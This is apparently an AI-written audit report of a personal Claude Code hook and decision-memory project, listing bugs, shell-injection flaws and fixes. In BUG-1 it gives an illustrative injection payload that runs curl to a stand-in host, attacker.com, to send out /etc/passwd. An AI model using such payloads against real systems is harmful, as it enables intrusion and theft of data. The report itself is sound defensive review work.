# AUDIT.md — Claude Code Orchestration Project

**Audited by:** Claude Sonnet 4.6
**Date:** 2026-03-20
**Scope:** Full project at `/Users/kelsiandrews/.claude`

---

## Executive Summary

This is a well-structured orchestration infrastructure for Claude Code. The core pipeline — session lifecycle hooks, correction detection, signal processing, decision memory, and the Gemini MCP server — is thoughtfully designed with good separation of concerns, meaningful fallback paths (e.g., Ollama unavailable → degrade gracefully), and consistent WAL mode + busy_timeout patterns across most SQLite writes.

**Critical issues (High):** 3 — two shell injection vectors, one missing DB connection timeout
**Important issues (Medium):** 8 — stale documentation in injected context, duplicate background process spawn, `write_targets` vs `write_files` column name mismatch, promotion threshold inconsistency, private method leakage, `skipDangerousModePermissionPrompt: true` with no audit note
**Minor issues (Low):** 6 — dead unreachable code, embedding call cap shared across detection/grouping, missing atexit on session-start freshness processes, `prev_assistant_had_tool_use` unused variable, `TRACKER_DIR` unused constant, `_check_promoted` function dead code

Overall score: **6.5 / 10** — solid design, undermined by a small cluster of real bugs and a few security gaps that could cause silent data corruption or execution vulnerabilities.

---

## Code Quality and Smells

### CQ-1 [Medium] — Stale `corrections.md` reference in Tier 2 context injection

**File:** `/Users/kelsiandrews/.claude/hooks/inject-tier2-context.sh`, line 109

The `infra_corrections` fragment injected on every prompt containing "correction" or "distill" tells Claude:

```
"Corrections: logged to corrections.md, tracked in correction_groups table..."
```

`corrections.md` is a dead surface (replaced by `log-correction.sh → DB` per decision-79). Claude sessions receiving this hint may attempt to write to a file that no longer exists or is no longer the source of truth, creating confusion. The hint should describe only the current pipeline.

**Fix:**
```
"Corrections: logged directly to correction_groups table in epics.db via log-correction.sh. Auto-detected via signal_processor.py at session end. Preferences rendered to .claude/rendered-prefs.md at session start. No corrections.md."
```

---

### CQ-2 [Medium] — `write_targets` column queried; actual column is `write_files`

**File:** `/Users/kelsiandrews/.claude/hooks/guard-direct-edit.sh`, lines 7, 97, 113, 125

The comment block and the embedded Python query reference `write_targets`:
```python
query = f'SELECT write_targets FROM stories WHERE state IN ({placeholders}) AND archived=0'
```

The actual column in `epics.db` is `write_files` (confirmed via `PRAGMA table_info(stories)`). SQLite returns an `OperationalError: no such column: write_targets`, which is caught by the `except Exception: print('EPICS_UNAVAILABLE')` handler. This causes the guard to fall back to block-all mode on every call, correctly blocking but never reaching the nuanced scope-check path. The feature silently doesn't work.

**Fix:** Change the query to `SELECT write_files FROM stories ...` and update the comment on lines 7 and 97.

---

### CQ-3 [Low] — `prev_assistant_had_tool_use` set but never read

**File:** `/Users/kelsiandrews/.claude/hooks/lib/signal_processor.py`, lines 123, 128, 135, 138, 141, 164

The variable `prev_assistant_had_tool_use` is set at multiple points in `extract_corrections()` but is never read — the logic intended to use it (e.g., boosting weight when a correction immediately follows a tool use) was removed but the variable wasn't cleaned up. Dead noise.

**Fix:** Remove all assignments to `prev_assistant_had_tool_use` in that function.

---

### CQ-4 [Low] — `_check_promoted()` is defined but never called

**File:** `/Users/kelsiandrews/.claude/hooks/lib/signal_processor.py`, lines 340–369

The function `_check_promoted(theme_text, project_root)` is fully implemented but has zero call sites anywhere in the codebase. It appears to have been replaced by the inline embedding check inside `process_session_corrections`. Dead code that creates confusion about intended design.

**Fix:** Delete the function.

---

### CQ-5 [Medium] — Duplicate `decision-freshness.py` background spawn in `load-session-context.sh`

**File:** `/Users/kelsiandrews/.claude/hooks/load-session-context.sh`, lines 314 and 333

The same `nohup python3 decision-freshness.py` command is spawned twice in one run of `load-session-context.sh` — once at line 314 (log filename uses `${CLAUDE_SESSION_ID:-$$}`) and once at line 333 (log filename uses `${SESSION_ID}`). Both are inside the same `if [[ "$PWD" == "$HOME/.claude" ]]` block. Two concurrent processes will both write to `decision_freshness` via `INSERT OR REPLACE`, causing redundant git subprocess calls on every scoped file and unnecessary DB write contention.

**Fix:** Remove the spawn at line 314. The one at line 333 uses the sanitized `SESSION_ID` and has the correct log filename.

---

### CQ-6 [Low] — `TRACKER_DIR` constant defined and never used

**File:** `/Users/kelsiandrews/.claude/hooks/cost-alert.sh`, line 12

```bash
TRACKER_DIR="/opt/homebrew/opt/claude-code-tracker/libexec/src"
```

This variable is never read. The cost value is found via `find` using a different path. Dead code that implies a path dependency that isn't actually used.

**Fix:** Delete line 12.

---

### CQ-7 [Medium] — `store._get_connection()` called directly from outside `DecisionStore`

**File:** `/Users/kelsiandrews/.claude/mcp-servers/decisions/server.py`, lines 174, 214, 250, 322, 384

`server.py` directly calls `store._get_connection()` in multiple MCP tool implementations. `_get_connection` is a private method of `DecisionStore`. This creates a coupling that will silently bypass future changes to connection setup (e.g., if WAL mode or sqlite-vec loading changes in `_get_connection`).

`record_project_decision` additionally manually commits and closes a connection obtained via `store._get_connection()` without going through `DecisionStore`'s own `record()` method, which means the FTS index, dump, and relationship tracking only partially run through the intended pipeline.

**Fix:** Add a `get_connection()` public method to `DecisionStore`, or better: add targeted methods like `update_decision_status(id, status, superseded_by)` and `add_relationship(id, entry)` that encapsulate the write operations.

---

### CQ-8 [Medium] — Promotion threshold hardcoded to 3 in `log-correction.sh`, diverging from `PROMOTION_THRESHOLD` constant

**File:** `/Users/kelsiandrews/.claude/scripts/log-correction.sh`, line 77

```python
new_status = 'pending_promotion' if new_count >= 3 else old_status
```

`signal_processor.py` defines `PROMOTION_THRESHOLD = 3` (line 258). `log-correction.sh` doesn't import this — it has a hardcoded `3`. If `PROMOTION_THRESHOLD` is ever changed in the Python module, `log-correction.sh` will silently use a different threshold, breaking parity between auto-detected and manual corrections.

**Fix:** Add a comment in both files documenting the coupling (`# Must match PROMOTION_THRESHOLD in signal_processor.py`), or factor out a standalone `upsert-correction.py` helper that both paths invoke.

---

### CQ-9 [Low] — Embedding call cap `MAX_EMBEDDING_CALLS_PER_SESSION = 5` misleadingly named

**File:** `/Users/kelsiandrews/.claude/hooks/lib/signal_processor.py`, lines 124, 144, 277, 491

`extract_corrections()` uses an `embedding_calls` counter capped at 5, and `process_session_corrections()` uses a separate `grouping_embedding_calls` also capped at 5. These are independent local counters, so a session can use up to 10 Ollama calls (5 for detection + 5 for grouping), plus 10 calls for prototype loading. The effective maximum is ~20 calls, not 5. The constant name and its docstring are misleading.

**Fix:** Rename to `MAX_EMBEDDING_CALLS_PER_PHASE` and add a comment: `# Applied independently in extraction and grouping phases`.

---

## Identified Bugs and Fixes

### BUG-1 [High] — Shell injection via `$FILE_PATH` interpolated into Python heredoc

**File:** `/Users/kelsiandrews/.claude/hooks/track-skill-changes.sh`, line 41

```bash
with open('$FILE_PATH') as f:
```

`$FILE_PATH` is expanded by bash before the heredoc content is fed to Python. A file path containing a single quote (e.g., `don't.jsx`) breaks the Python syntax. A path containing `') ; import os; os.system("curl attacker.com -d $(cat /etc/passwd)")  #` would execute arbitrary code with the hook process's permissions.

While `FILE_PATH` originates from Claude's tool input JSON (parsed by `parse_hook_input.py`), Claude may legitimately be asked to edit files with unusual names, and this is still an injection vector.

**Fix:** Pass the path as a command-line argument rather than string interpolation — the same pattern already used correctly in `guard-direct-edit.sh` and `inject-tier2-context.sh`:
```bash
python3 - "$FILE_PATH" <<'PYEOF'
import sys
file_path = sys.argv[1]
with open(file_path) as f:
    ...
PYEOF
```

---

### BUG-2 [High] — Shell injection via `$TOKENS_FILE`, `$COST`, `$THRESHOLD` interpolated into Python `-c` strings

**File:** `/Users/kelsiandrews/.claude/hooks/cost-alert.sh`, lines 18, 43, 56–57

```bash
COST=$(python3 -c "
    with open('$TOKENS_FILE') as f:
```

`$TOKENS_FILE` comes from `find` across user-writable directories including `/tmp`. A file named `/tmp/tokens-2026-03-20.json` can be created by any process. A filename containing `') ; import os; os.system('...')#` would execute on the next Stop hook invocation.

`$COST` and `$THRESHOLD` are also interpolated directly into Python expressions (`float('$COST')`). If either contains a quote or special characters from a malformed tracker file, this is an additional injection path.

**Fix for `TOKENS_FILE`:** Use heredoc + `sys.argv`:
```bash
COST=$(python3 - "$TOKENS_FILE" <<'PYEOF'
import json, sys
try:
    with open(sys.argv[1]) as f:
        d = json.load(f)
    cost = d.get('estimated_cost_usd') or d.get('today', {}).get('estimated_cost_usd') or 0
    print(f'{float(cost):.2f}')
except Exception:
    print('0.00')
PYEOF
)
```

**Fix for `$COST`/`$THRESHOLD`:** Pass as `sys.argv` arguments to the comparison script.

---

### BUG-3 [High] — `main_logic()` opens SQLite connection without `timeout`

**File:** `/Users/kelsiandrews/.claude/hooks/lib/signal_processor.py`, line 808

```python
conn = sqlite3.connect(db_path)
```

Every other DB connection in this file and across the project uses `timeout=5` or `timeout=10`. This connection has no timeout — if `epics.db` is locked (e.g., by auto-distillation running concurrently in `stop_processor.py`), `main_logic` will block the background process indefinitely. Since this runs in a nohup background subprocess, a hung process would hold the fcntl lock and prevent future stop hook runs for the same session.

**Fix:**
```python
conn = sqlite3.connect(db_path, timeout=10)
conn.execute("PRAGMA journal_mode=WAL")
conn.execute("PRAGMA busy_timeout=5000")
```

---

### BUG-4 [Medium] — Scope matching in `inject-project-decisions.sh` produces false positives

**File:** `/Users/kelsiandrews/.claude/hooks/inject-project-decisions.sh`, lines 73–81

```python
OR ? LIKE '%' || ds.scope_value || '%'
OR ds.scope_value LIKE '%' || ? || '%'
```

The first condition asks "does the file path contain the scope value as a substring?" — a scope of `py` would match `apply.tsx` or any path containing the letters `py`. The second inverts this: "does the scope value contain the filename as a substring?" — a scope of `hooks/lib/signal_processor.py` would match `signal_processor.py` alone. Both are overly broad. Active decisions meant for `hooks/lib/` would inject into every `.py` file anywhere in the project.

**Fix:** Use path-prefix matching:
```python
OR ? LIKE ds.scope_value || '%'
OR ? LIKE '%/' || ds.scope_value
```
Or, after the SQL query, filter with Python's `fnmatch.fnmatch(file_path, scope_value)` — as `server.py`'s `query_project_decisions` already does correctly.

---

### BUG-5 [Medium] — `dedup_check` in `om_write.py` floods stderr when Ollama is down

**File:** `/Users/kelsiandrews/.claude/hooks/lib/om_write.py`, line 76

```python
print("om_write: ollama_fallback — embedding unavailable for dedup", file=sys.stderr)
```

This fires on every single `dedup_check()` call when Ollama is unavailable. `om_write()` is called by session summary, auto-distillation, and hook generation — potentially dozens of times per stop hook run. Each call emits a separate warning to stderr, creating noise that obscures actual errors in stop-processor logs.

**Fix:** Add a module-level flag:
```python
_ollama_fallback_warned = False

def dedup_check(content, primary_tag):
    global _ollama_fallback_warned
    embedding = get_embedding(content)
    if embedding is None:
        if not _ollama_fallback_warned:
            print("om_write: ollama_fallback — embedding unavailable for dedup", file=sys.stderr)
            _ollama_fallback_warned = True
        # fall through to simhash...
```

---

### BUG-6 [Medium] — `stage_hook_generation` schema migration check is fragile; `executescript` has implicit commit side effects

**File:** `/Users/kelsiandrews/.claude/hooks/lib/stop_processor.py`, lines 240–263

The migration guard checks for the literal string `'dismissed'` in the DDL text:
```python
if schema_sql and "'dismissed'" not in schema_sql[0]:
```

This breaks if the DDL string is reformatted (e.g., double-quoted instead of single-quoted). If the guard fails, `executescript` runs the full rename-and-recreate migration on an already-migrated schema, causing `INSERT INTO correction_groups SELECT * FROM correction_groups_old` to fail with "no such table: correction_groups_old" — but `executescript` will have already renamed the live table and committed, leaving the DB in a broken state.

**Fix:** Use the PRAGMA-based column check already established elsewhere in the codebase:
```python
cols = conn.execute("PRAGMA table_info(correction_groups)").fetchall()
col_names = {c[1] for c in cols}
if 'status' not in col_names or 'dismissed' not in (conn.execute(
    "SELECT sql FROM sqlite_master WHERE name='correction_groups'"
).fetchone() or ('',))[0]:
    # run migration
```
Or, simpler: check `col_names` for the absence of a column added in that migration pass.

---

### BUG-7 [Medium] — `skipDangerousModePermissionPrompt: true` is set with no recorded rationale

**File:** `/Users/kelsiandrews/.claude/settings.json`, line 191

```json
"skipDangerousModePermissionPrompt": true
```

This bypasses Claude's interactive confirmation for potentially dangerous operations globally. The hook infrastructure provides some compensating controls (`guard-direct-edit`, `block-env-read`, `guard-protected-files`), but all three are per-tool and do not gate raw Bash execution. `warn-sync-heavy-bash` is advisory-only and async. A prompt that convinces Claude to run an arbitrary shell command would not be stopped by any hook.

This is not necessarily wrong for this setup but has no recorded decision. If removed for any reason (e.g., new machine setup), the behavior would silently change.

**Recommendation:** Record a decision (`pm_add_decision`) explaining the rationale. If the setting was added for convenience rather than deliberate policy, consider reverting.

---

## Recommendations for Improvements

### REC-1 — Centralize all SQLite connection creation

`signal_processor.py`, `om_write.py`, `stop_processor.py`, `decision-freshness.py`, and `server.py` each open SQLite connections with slightly varying parameters. A shared `_connect(path, timeout=10)` helper in `hooks/lib/` would enforce consistent WAL + busy_timeout across all call sites and eliminate BUG-3.

### REC-2 — Project-wide lint for `python3 -c "...with open('$VAR')..."` pattern

Add a grep check in `scripts/validation-runner.sh` that fails if any hook script contains `'$` inside a `python3 -c "..."` invocation. This would catch BUG-1 and BUG-2 automatically.

### REC-3 — Add `guard-direct-edit.sh` column name test to validation-runner.sh

The `write_targets` vs `write_files` bug (CQ-2) could be caught by a simple test that runs the embedded Python block against a test DB and asserts the result is not `EPICS_UNAVAILABLE`. Add this to `scripts/validation-runner.sh`.

### REC-4 — `record_project_decision`: encapsulate DB writes inside `DecisionStore`

The current pattern in `server.py` (open a second connection via `store._get_connection()`, manually write, manually commit) bypasses `DecisionStore`'s own write path. Extract `update_decision_status`, `add_related_decision`, and `supersede` as methods on `DecisionStore` to restore single-path integrity.

### REC-5 — `inject-project-decisions.sh`: use fnmatch instead of LIKE substring

The scope matching in BUG-4 produces false positive injections on short scope values. Switching to Python `fnmatch` (as `server.py` does) would eliminate noisy context injections that erode prompt quality.

### REC-6 — Stage 4 distillation: commit DB promotions before OM writes

`stage_auto_distillation` currently interleaves DB commits and `om_write` calls per-row. If `om_write` raises mid-loop, the DB commit has happened but OM doesn't have the entry. Record all DB promotions first, commit once, then do OM writes so the DB is the authoritative source and OM failures are safe to retry.

### REC-7 — `_default_provider` global in `decision_memory/embeddings.py` is not thread-safe

`get_default_provider()` uses a module-level global without locking. FastMCP may invoke concurrent tool calls. Add a `threading.Lock` around the initialization check.

### REC-8 — Tag matching in `om_write.py` uses `LIKE '%tag%'` which matches substrings

`tags LIKE '%tool-learning%'` also matches any tag containing `tool-learning` as a substring. The current `ALLOWED_TAGS` set has no overlapping substrings, so this is low-risk today. Consider storing tags in a normalized join table or using `json_each` for correctness.

---

## Overall Score

**6.5 / 10**

**Rationale:** The architecture is solid — tiered context injection, WAL-mode SQLite everywhere, graceful degradation when Ollama is absent, the policy-mechanism split for scripts vs skills, and the three-layer decision injection are all good engineering decisions. The 16-test suite in `hook_generator.py` and the `decision_memory/test_e2e.py` tests show the right instinct.

What pulls the score down: two exploitable shell injection vectors in stop hook scripts (BUG-1, BUG-2), one missing DB timeout that can cause indefinite background process hangs (BUG-3), a silent feature regression where the scope-checking path in `guard-direct-edit.sh` has never worked due to a column name typo (CQ-2), a stale documentation fragment actively injected into Claude's context each session (CQ-1), and `skipDangerousModePermissionPrompt: true` with no recorded justification (BUG-7). None of these require architectural changes — every one is fixable in under 30 minutes.

| Category | Count | Critical |
|---|---|---|
| Security (shell injection, permissions) | 3 | 2 High, 1 Medium |
| Correctness / Bugs | 4 | 1 High, 3 Medium |
| Code quality / smells | 9 | 0 High, 4 Medium, 5 Low |
| Recommendations | 8 | — |
